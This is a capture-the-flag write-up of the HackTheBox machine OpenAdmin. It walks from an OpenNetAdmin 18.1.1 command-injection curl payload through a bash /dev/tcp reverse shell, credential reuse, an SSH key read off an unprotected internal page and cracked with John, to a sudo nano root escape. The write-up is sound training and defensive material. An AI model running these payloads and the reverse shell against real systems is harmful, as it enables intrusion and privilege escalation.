---
toc: true
comments: true
title: HackTheBox - OpenAdmin
layout: post
title: HackTheBox - OpenAdmin
date: 2024-06-15 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Linux, OpenNetAdmin, RCE, Credential Reuse, SSH, John, Sudo, GTFOBins, PrivEsc]    
image: /assets/Posts/OpenAdmin/logo.png
---

## Pre
- OpenAdmin is a proper little chain: a web-app RCE, then two hops of **credential reuse**, a cracked SSH key, and finally a classic **GTFOBins `sudo`** escape.
- It's the box that really drills in the single most valuable habit in Linux pentesting: when you find a password, *try it everywhere*.
- After the single-step escalations on [Bashed](/posts/hackthebox-bashed/) and [Cap](/posts/hackthebox-cap/), this one rewards patience and note-taking.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 22,80 -T4 -sSCV -A -oN nmap/versions $IP
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Default Apache page on port 80 – so the interesting content lives in a subdirectory. Fuzz it:

```shell
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/music                (Status: 301)
/artwork              (Status: 301)
/sierra               (Status: 301)
```

`/music` has a "Login" link that redirects to `/ona`, which lands on an **OpenNetAdmin** dashboard proudly displaying its version:

```
OpenNetAdmin v18.1.1
```

## Phase 2: OpenNetAdmin RCE
That version has a well-known unauthenticated command injection.

```shell
$ searchsploit OpenNetAdmin
-------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
-------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Remote Code Execution        | php/webapps/47691.sh
-------------------------------------------------- ---------------------------------
```

The bug is in the `xajax` handler: a POST parameter is passed into a shell command unsanitised. The exploit is a tiny bash loop, but let's understand it rather than just run it – at its core it's a single `curl`:

```shell
$ curl --data "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id;&xajaxargs[]=ping" \
    http://10.10.10.171/ona/
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Our command (`id`) ran. Running the exploit script gives us a semi-interactive `www-data` shell. From here we upgrade to a proper reverse shell (`bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'`) and stabilise it.

## Phase 3: Credential reuse (hop #1)
`www-data` can't read the user flag, so we look for secrets. Web apps keep database credentials in config files – for OpenNetAdmin that's the `database_settings.inc.php`:

```shell
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
$ona_contexts=array (
  'DATABASE_USER_PASSWORD' => 'n1nj4W4rri0R!',
);
```

A juicy password. Now the golden rule: **try it against the local users.** `/etc/passwd` shows `jimmy` and `joanna`. The DB password is reused for `jimmy`:

```shell
$ ssh jimmy@10.10.10.171
jimmy@openadmin:~$ id
uid=1000(jimmy)
```

## Phase 4: Internal app → joanna's key (hop #2)
`jimmy` still isn't the user with the flag (`joanna` is). Poking around `/var/www` we find an **internal web app** in `/var/www/internal`, served on a localhost-only port (52846). It has a `main.php` that prints joanna's private SSH key – but the login (`index.php`) is meant to gate it. Crucially, `main.php` performs **no session check of its own**, so we just request it directly:

```shell
jimmy@openadmin:~$ curl http://localhost:52846/main.php
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
...
-----END RSA PRIVATE KEY-----
```

The key is **passphrase-encrypted** (`Proc-Type: 4,ENCRYPTED`). We crack the passphrase offline with `ssh2john` + John:

```shell
$ ssh2john joanna_id_rsa > hash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
bloodninjas      (joanna_id_rsa)
```

With the passphrase `bloodninjas`, we SSH in as joanna and grab the user flag:

```shell
$ ssh -i joanna_id_rsa joanna@10.10.10.171
Enter passphrase for key 'joanna_id_rsa': bloodninjas
joanna@openadmin:~$ cat user.txt
```

## Phase 5: Privilege Escalation via sudo nano
The finale is a GTFOBins classic. Check joanna's sudo rights:

```shell
joanna@openadmin:~$ sudo -l
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

joanna can run **`nano`** as root (on a specific file, but that restriction is meaningless – nano is an editor with a shell escape). [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) tells us exactly how:

```shell
joanna@openadmin:~$ sudo /bin/nano /opt/priv
# inside nano press Ctrl+R then Ctrl+X, and run:
reset; sh 1>&0 2>&0
```

nano executes our command *as root*, dropping us into a root shell:

```shell
# id
uid=0(root) gid=0(root) groups=0(root)
```

> This is why "let the user edit just one file with sudo" is a false sense of security. Any interactive program with a shell-escape (nano, vi, less, more, man…) is equivalent to giving away root. Check GTFOBins before assuming a `sudo` rule is safe.
{: .prompt-warning }

## Conclusions
- OpenAdmin is a credential-reuse gauntlet: web-app RCE → DB password → `jimmy` → leaked SSH key → cracked passphrase → `joanna` → `sudo nano` → root. Every hop reused information the previous one exposed.
- Two habits win this box: try every password against every user, and always check GTFOBins for any binary you can run via `sudo` or that carries the SUID bit.
- Next we get our hands dirty with an XML parser on [BountyHunter](/posts/hackthebox-bountyhunter/).

_Keep hacking_  🙈🙉🙊
